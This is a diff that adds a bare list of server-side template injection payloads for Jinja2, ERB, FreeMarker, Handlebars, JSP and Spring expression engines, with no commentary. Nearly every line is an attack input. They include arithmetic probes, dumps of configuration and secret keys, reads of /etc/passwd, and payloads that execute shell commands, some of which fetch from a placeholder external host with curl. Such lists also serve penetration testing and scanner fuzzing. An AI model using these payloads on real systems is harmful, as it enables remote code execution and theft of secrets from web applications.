@@ -1,0 +1,45 @@
+{{7*7}}
+{{7*'7'}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{request['application']['__globals__']['os']['popen']('id')['read']()}}
+<%= 7*7 %>
+<%=`id`%>
+<%25%3d+7*7+%25>
+<%= system('cat /etc/passwd') %>
+<%= `ls -la` %>
+<%= exec('curl http://x.x.x.x') %>
+${7*7}
+${7*'7'}
+#{7*7}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("curl http://x.x.x.x") }
+{{"".__class__.__mro__[1].__subclasses__()[59]("ls",shell=True,stdout=-1).communicate()}}
+{{''.__class__.__mro__[1].__subclasses__()[59]("id",shell=True,stdout=-1).communicate()}}
+#{7*7}
+{{7*7}}.toString()
+{{7*'7'}}.toString()
+{{[].__class__.__base__.__subclasses__()}}
+{{ [].__class__.__base__.__subclasses__()[59]("ls",shell=True,stdout=-1).communicate() }}
+{{request.args}}
+{% debug %}
+{{settings.SECRET_KEY}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{% import os %}
+{{os.system('id')}}
+${{<%[%'"}}%\
+{{url_for.__globals__['os'].popen('curl http://x.x.x.x').read()}}
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()[59]("id",shell=True,stdout=-1).communicate()}}
+wrtz{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+wrtz{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('curl http://x.x.x.x');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+<%+7*7%>
+<%@ include file="evil.jsp" %>
+<jsp:include page="evil.jsp" />
+#{'freemarker.template.utility.Execute'?new()('id')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://x.x.x.x')}
